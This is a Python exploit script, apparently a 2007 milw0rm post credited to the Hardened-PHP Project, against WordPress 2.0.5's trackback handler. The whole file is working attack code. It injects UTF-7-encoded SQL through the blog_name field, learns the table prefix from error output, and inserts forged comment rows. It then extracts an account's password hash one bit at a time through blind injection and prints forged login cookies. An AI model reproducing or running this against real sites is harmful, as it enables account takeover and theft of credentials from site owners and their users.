#!/usr/bin/python
#######################################################################
#  _  _                _                     _       ___  _  _  ___
# | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \| || || _ \
# | __ |/ _` || '_|/ _` |/ -_)| ' \ / -_)/ _` ||___||  _/| __ ||  _/
# |_||_|\__,_||_|  \__,_|\___||_||_|\___|\__,_|     |_|  |_||_||_|
#
#######################################################################
#         Proof of concept code from the Hardened-PHP Project
#
#                         NOT FOR DISTRIBUTION
#                    PLEASE DO NOT SPREAD THIS CODE
#
#######################################################################
#
#                        -= Wordpress 2.0.5 =-
#                Trackback UTF-7 SQL injection exploit
#
#                   beware of encoded single-quotes
#
#######################################################################

import urllib
import getopt
import sys
import string
import re
import time
import datetime
import md5

__argv__ = sys.argv

def banner():
    print "Wordpress 2.0.5 - Trackback UTF-7 SQL injection exploit"
    print "Copyright (C) 2006 Stefan Esser/Hardened-PHP Project"
    print "            *** DO NOT DISTRIBUTE ***\n"

def usage():
    banner()
    print "Usage:\n"
    print "   $ ./wordpressx.py [options]\n"
    print "        -h http_url   url of the Wordpress blog"
    print "                      f.e. http://www.wordpress.org/development/"
    print "        -p id         id of posting to exploit trackback (default: 1)"
    print "        -i id         User id to steal password hash for(default: -1)"
    print "        -u username   username to steal password hash for (default: ...)"
    print ""
    sys.exit(-1)

def determineCookieHash(host):

    wclient = urllib.URLopener()

    print "[+] Connecting to retrieve cookie hash"

    try:
        req = wclient.open(host + "/wp-login.php?action=logout")
    except IOError, e:
        if e[1] == 302:
            # Got a 302 redirect, but check for cookies before redirecting.
            # e[3] is a httplib.HTTPMessage instance.
            if e[3].dict.has_key('set-cookie'):
                cookie = e[3].dict['set-cookie'];
                chash = cookie[string.find(cookie, "user_")+5:]
                chash = chash[:string.find(chash, "=")]
                print "[+] Cookie hash found: %s" % chash
                return chash


    print "[-] Unable to retrieve cookie... something is wrong"
    sys.exit(-3)
    return ""

def determineIsMbstringInstalled(host, pid):

    wclient = urllib.URLopener()

    print "[+] Connecting to check if mbstring is installed"

    params = {
        'charset' : 'UTF-7',
	    'title' : '+ADA-'
    }

    try:
        req = wclient.open(host + "/wp-trackback.php?p=" + pid, urllib.urlencode(params))
    except IOError, e:
        if e[1] == 302:
            print "[+] ext/mbstring is installed. continue with exploit"
            return 1

    content = req.read()

    if string.find(content, 'error>1</error>') != -1:
        print "[-] Illegal posting id choosen, test impossible"
        sys.exit(-2)

    print "[-] ext/mbstring not installed... exploit not possible"
    sys.exit(-2)
    return 0

def determineTablePrefix(host, pid):

    wclient = urllib.URLopener()

    print "[+] Connecting to determine mysql table prefix"

    params = {
        'charset' : 'UTF-7',
	    'title' : 'None',
        'url' : 'None',
        'excerpt' : 'None',
        'blog_name' : '+ACc-ILLEGAL'
    }

    try:
        req = wclient.open(host + "/wp-trackback.php?p=" + pid, urllib.urlencode(params))
    except IOError, e:
        if e[1] == 302:
            print "[-] Table prefix cannot be determined... exploit not possible"
            sys.exit(-2)
            return ""

    content = req.read()

    f = re.search('FROM (.*)comments WHERE', content)
    if f != None:
        prefix = f.group(1)
        print "[+] Table prefix is: %s" % prefix
        return prefix

    print "[-] Table prefix cannot be determined... exploit not possible"
    sys.exit(-2)
    return ""

def lockTrackbacks(host, pid):

    now = datetime.datetime.utcnow()
    now = now.replace(microsecond = 0)

    future = now + datetime.timedelta(days=1)
    future = future.replace(microsecond = 0)

    wclient = urllib.URLopener()

    print "[+] Connecting to lock trackbacks"

    author = "Mark Mouse"
    author_email = "mark@incidents.org"
    author_url = ""
    author_ip = "210.35.2.3"
    agent = "Internet Explorer"
    futuredate = future.isoformat(' ')
    futuredate_gmt = future.isoformat(' ')
    date = now.isoformat(' ')
    date_gmt = now.isoformat(' ')

    sql = "%s','%s','%s','%s','%s','%s','','0','%s','comment','0','0'),('0', '', '', '', '', '%s', '%s', '', 'spam', '', 'comment', '0','0' ) /*" % \
          ( author , author_email , author_url , author_ip , date , date_gmt , agent, futuredate, futuredate_gmt )

    sql = string.replace(sql, "'", "+ACc-")

    params = {
        'charset' : 'UTF-7',
	    'title' : 'None',
        'url' : 'None',
        'excerpt' : 'None',
        'blog_name' : sql
    }

    try:
        req = wclient.open(host + "/wp-trackback.php?p=" + pid, urllib.urlencode(params))
    except IOError, e:
        if e[1] == 302:
            print "[-] Table prefix cannot be determined... exploit not possible"
            sys.exit(-2)
            return ""

    content = req.read()

    return ""

def checkUsername(host, pid, prefix, name, uid):

    wclient = urllib.URLopener()

    print "[+] Connecting to check if user %s is present" % name

    if uid != -1:
        sql = "' AND 1=0) UNION SELECT 1 FROM %susers WHERE ID='%s' /*" % (prefix, uid)
    else:
        sql = "' AND 1=0) UNION SELECT 1 FROM %susers WHERE user_login='%s' /*" % (prefix, name)

    sql = string.replace(sql, "'", "+ACc-")

    params = {
        'charset' : 'UTF-7',
	    'title' : 'None',
        'url' : 'None',
        'excerpt' : 'None',
        'blog_name' : sql
    }

    req = wclient.open(host + "/wp-trackback.php?p=" + pid, urllib.urlencode(params))

    content = req.read()


    if string.find(content, 'Duplicate') != -1:
        return 1
    if string.find(content, 'Doppelter') != -1:
        return 1

    if uid != -1:
        print "[-] Error user_id invalid"
    else:
        print "[-] Error username invalid"
    sys.exit(-2)
    return 0


def bruteforceBit(host, pid, prefix, name, uid, bit):

    wclient = urllib.URLopener()

    nibble = (bit / 4) + 1
    bit = (bit % 4) + 1

    sql = "' AND 1=0) UNION SELECT 1 FROM %susers WHERE " % prefix

    if uid != -1:
        sql = sql + "ID='%s'" % uid
    else:
        sql = sql + "user_login='%s'" % name

    sql = sql + " and substring(reverse(lpad(conv(substring(user_pass, %d,1), 16, 2),4,'0')),%d,1)='1' /*" % (nibble, bit)

    sql = string.replace(sql, "'", "+ACc-")

    params = {
        'charset' : 'UTF-7',
	    'title' : 'None',
        'url' : 'None',
        'excerpt' : 'None',
        'blog_name' : sql
    }

    req = wclient.open(host + "/wp-trackback.php?p=" + pid, urllib.urlencode(params))

    content = req.read()

    if string.find(content, '15 seconds') != -1:
        return 0
    if string.find(content, '15 Sekunden') != -1:
        return 0
    if string.find(content, 'Duplicate') != -1:
        return 1
    if string.find(content, 'Doppelter') != -1:
        return 1

    print "[-] Error retrieving password hash: unexpected reply at bit %d" % bit
    sys.exit(-2)
    return ""

def bruteforce(host, pid, prefix, name, uid):

    phash = ""

    print "[+] Retrieving the password hash bit by bit"

    for i in range(32):
        nibble = 0
        for j in range(4):
            nibble = nibble | (bruteforceBit(host, pid, prefix, name, uid, i*4+j) << j)
        phash = phash + "%x" % nibble

    return phash


def main():
    try:
        opts, args = getopt.getopt(sys.argv[1:], "h:i:u:p:e:d:")
    except getopt.GetoptError:
        usage()

    if len(__argv__) < 2:
        usage()

    username = 'admin'
    password = None
    email = None
    domain = None
    host = None
    pid = 1
    uid = -1
    for o, arg in opts:
        if o == "-h":
	        host = arg
        if o == "-p":
            pid = arg
        if o == "-i":
            uid = arg
        if o == "-u":
            username = arg
        if o == "-e":
            email = arg
        if o == "-d":
            domain = arg

    # Printout banner
    banner()

    # Check if everything we need is there
    if host == None:
        print "[-] need a host to connect to"
        sys.exit(-1)

#    if username == None:
#        print "[-] username needed to continue"
#        sys.exit(-1)
#    if password == None:
#        print "[-] password needed to continue"
#        sys.exit(-1)
#    if email == None:
#        print "[-] email address needed to continue"
#        sys.exit(-1)
#    if domain == None:
#        print "[-] catch all domain needed to continue"
#	    sys.exit(-1)

    determineIsMbstringInstalled(host, pid)
    chash = determineCookieHash(host)
    lockTrackbacks(host, pid)

    prefix = determineTablePrefix(host, pid)
    checkUsername(host, pid, prefix, username, uid)

    phash = bruteforce(host, pid, prefix, username, uid)

    print "[+] Done..."
    print "    The password hash is %s" % phash

    m = md5.new()
    m.update(phash)
    cphash = m.hexdigest()

    print "    The logincookies are:"
    print "       wordpressuser_%s=%s" % (chash, username)
    print "       wordpresspass_%s=%s" % (chash, cphash)

if __name__ == "__main__":
    main()

# milw0rm.com [2007-01-07]